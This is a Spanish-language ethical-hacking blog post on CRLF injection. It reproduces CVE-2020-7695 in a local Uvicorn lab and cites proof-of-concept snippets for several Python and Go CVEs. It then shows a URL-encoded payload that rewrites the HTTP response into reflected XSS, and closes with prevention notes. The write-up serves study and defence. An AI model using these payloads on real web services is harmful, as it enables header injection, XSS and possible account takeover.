---
author: joshua_provoste
layout: post
title: Generación de payloads para inyecciones CRLF (Carriage Return Line Feed)
date: 2023-04-04
categories: [Ethical Hacking, CRLF]
---

Las inyecciones CRLF (Carriage Return Line Feed) me parecen interesantes: mediante fuzzing se identifica un entry-point que permite saltar de una línea a otra, o inyectar nuevas líneas, para introducir datos de forma arbitraria, reescribiendo, literalmente, un HTTP response.

Al buscar referencias técnicas, uno de los hallazgos más extraños y extravagantes que he leído, es el de una inyección CRLF usando el caracter + en reemplazo de los hexadecimales **%0D%0A** equivalentes a \r\n, para una recompensa de casi $3,000 USD en HackerOne:

- https://blog.innerht.ml/overflow-trilogy/
- https://hackerone.com/reports/53843

## Conceptos básicos sobre inyecciones CRLF

Para revisar los detalles asociados, hemos dispuesto del siguiente repositorio:

- https://github.com/E-Virtus/cybersecurity_tools/tree/master/Inyecciones_CRLF
- Esta vulnerabilidad está contemplada como [inyección (A03) en la versión 2021 del Top 10 de OWASP](https://owasp.org/Top10/A03_2021-Injection/)
- Referencia: https://owasp.org/www-community/vulnerabilities/CRLF_Injection

En el caso de Python, podemos ejemplificar la utilización de CRLF de la siguiente manera:

```py
Python 3.10.4 (main, Apr  2 2022, 09:04:19) [GCC 11.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> a = "CRLF\r\n"
>>> a
'CRLF\r\n'
>>> print(a)
CRLF

>>>
```

A modo de ejemplo, podríamos encontrar esta clase de vulnerabilidades en módulos o dependencias de desarrollo, como por ejemplo Go y Python:

- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9741

```go
r, _ := http.NewRequest("GET", "http://localhost:8080/?crlf=HTTP/1.0\nCRLF:Here",nil)
```

- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9947

```py
urllib.request.urlopen('http://127.0.0.1:1234/HTTP/1.1\r\nHeader: Value\r\nHeader2: \r\n')
```

- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26137

```py
conn.request(method="GET / HTTP/1.1\r\nHost: abc\r\nRemainder:", url="/index.html")
```

## Setup de laboratorio para Inyecciones CRLF

![Uvicorn CVE-2020-7695](https://e-virtus.s3.us-east-2.amazonaws.com/blog/CVE-2020-7695_uvicorn_crlf_2023_04_04.png)

Uvicorn es un servidor web de tipo ASGI para el cual fue registrado el código CVE-2020-7695, asociado a sus versiones anteriores a 0.11.7, por una vulnerabilidad de inyección CRLF. Sin embargo, en el advisory sólo fue publicada una prueba de concepto para inyección de HTTP headers:

- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7695
- https://security.snyk.io/vuln/SNYK-PYTHON-UVICORN-570471

Para crear y habilitar el entorno vulnerable con **venv**:

```
python3 -m venv crlf_poc
python3 source crlf_poc/bin/activatec
wget https://github.com/encode/uvicorn/archive/refs/tags/0.11.6.zip
unzip 0.11.6.zip
cd uvicorn-0.11.6
python3 -m pip install -r requirements.txt
python3 setup.py install
```

Con el objetivo de emular la vulnerabilidad, utilicé el siguiente código **crlf.py**:

```py
async def app(scope, receive, send):
    assert scope['type'] == 'http'

    await send({
        'type': 'http.response.start',
        'status': 200,
        'headers': [
            [b'Content-Type', b'text/plain'],[b'X-XSS-Protection',b'1; mode=block'],[b'Referer',scope['path'].encode()],
        ],
    })
    await send({
        'type': 'http.response.body',
        'body': b'POC CRLF - CVE-2020-7695'
    })
```

Finalmente, es necesario ejecutar crlf.py para reproducir completamente el CVE-2020-7695:

```
uvicorn crlf:app --port 1234 --http httptools
```

Entonces, reenviamos un HTTP request a Burp Suite para verificar la inyección de HTTP headers usando el mismo payload publicado en el advisory:

```
curl http://e-virtus.local:1234/foo%0d%0abar:%20baz -x http://127.0.0.1:8080 --insecure
```

![Uvicorn CVE-2020-7695 POC](https://e-virtus.s3.us-east-2.amazonaws.com/blog/CVE-2020-7695_uvicorn_crlf_poc_2023_04_04.png)

## De CRLF (Carriage Return Line Feed) a XSS (Cross-site Scripting) Reflected

Bajo un contexto estricto, las inyecciones de HTTP headers, por sí mismas, no representan un impacto alto, tampoco medio; más bien, son de severidad baja, porque tienen que cumplirse ciertas situaciones para que se incremente la severidad, sin embargo, el advisory del CVE-2020-7695 fue publicado como severidad media, sin la debida comprobación del impacto.

Al utilizarse, por ejemplo, las siguientes HTTP headers, en teoría, una vulnerabilidad de inyección Cross-site Scripting (XSS) no es posible:

```
content-type: text/plain
x-xss-protection: 1; mode=block
```

No obstante, podemos bypassear estas y otras restricciones de configuración y seguridad basadas en HTTP headers (CORS,CSP, etc.), usando payloads como este, en donde seremos capaces de reescribir el HTTP response casi por completo:

```html
%0d%0acontent-type%3a%20text/html%3b+charset%3dutf-8%0d%0a%0d%0a
<script>
  alert("de_CRLF_a_XSS");
</script>
```

![Uvicorn CVE-2020-7695 - Cross-site Scripting (XSS)](https://e-virtus.s3.us-east-2.amazonaws.com/blog/CVE-2020-7695_uvicorn_crlf_cross_site_scripting_1_2023_04_04.png)
![Uvicorn CVE-2020-7695 - Cross-site Scripting (XSS)](https://e-virtus.s3.us-east-2.amazonaws.com/blog/CVE-2020-7695_uvicorn_crlf_cross_site_scripting_2.png)

Es así, entonces, es como se puede incrementar la severidad del CVE-2020-7695, de baja a media, utilizando la inyección de HTTP headers como factor de combinación (bug chaining), y nos abrimos paso a posibles ataques de severidad alta, como por ejemplo, Account Takeover (ATO).

## Generación de payloads para Inyecciones CRLF

Considerando múltiples factores de codificación, combinación, y uso práctico, obtuve un diccionario con 384 payloads nuevos y únicos para inyecciones CRLF, usando este laboratorio de Uvicorn para su comprobación:

- https://github.com/E-Virtus/cybersecurity_tools/tree/master/Inyecciones_CRLF

## Nuclei: comprobación de payloads para amplificación del alcance

Últimamente he utilizado bastante Nuclei como herramienta de automatización, por lo cual decidí crear una plantilla para automatizar la validación (la cual está disponible en el repositorio público de E-Virtus), logrando, el siguiente resultado:

[![Uvicorn CVE-2020-7695 - Cross-site Scripting (XSS)](https://e-virtus.s3.us-east-2.amazonaws.com/blog/CVE-2020-7695_uvicorn_crlf_cross_site_scripting_3_2023_04_04.png)](https://www.youtube.com/watch?v=hkzNsQzS8Sk)
[![Uvicorn CVE-2020-7695 - Cross-site Scripting (XSS)](https://e-virtus.s3.us-east-2.amazonaws.com/blog/CVE-2020-7695_uvicorn_crlf_cross_site_scripting_4_2023_04_04.png)](https://www.youtube.com/watch?v=hkzNsQzS8Sk)

## Prevención y remediación de Inyecciones CRLF

El principal factor a considerar está determinado por las condiciones inusuales e imprevistas que permiten la explotación de esta clase de vulnerabilidades.

- Sanitizar todas las entradas de datos, particularmente las relacionadas a HTTP headers
- No es cierto decir que se trata de una vulnerabilidad "fácil de prevenir" o de identificar, ya que hoy en día el despliegue de proyectos tecnológicos involucran diversos componentes de desarrollo e infraestructura que generalmente quedan fuera del alcance

## ¿Qué más podemos esperar de las inyecciones CRLF?

Tras esta pequeña investigación, uno de los plantemientos técnicos que ya podemos establecer: Blind CRLF Injection.

A la fecha de publicación de este artículo, no existen referencias técnicas para Blind CRLF, pero dado el contexto, es perfectamente reproducible, considerando la amplia difusión de ataques Blind para XSS, SSRF y OS Command Injection.

De forma complementaria, y a partir de las referencias prácticas que fueron usadas para la generación de payloads, la inyección CRLF podría estar presente no sólo en HTTP headers:

- Valores de parámetros en URL como entry-points
- Uso del caracter ? como entry-point de parámetros en URL
- Uso factible de URL encode
- Inyección CRLF como inyección de HTML

Entre muchos otros comportamientos que pueden ser consultados en el repositorio de E-Virtus:

- https://github.com/E-Virtus/cybersecurity_tools/tree/master/Inyecciones_CRLF
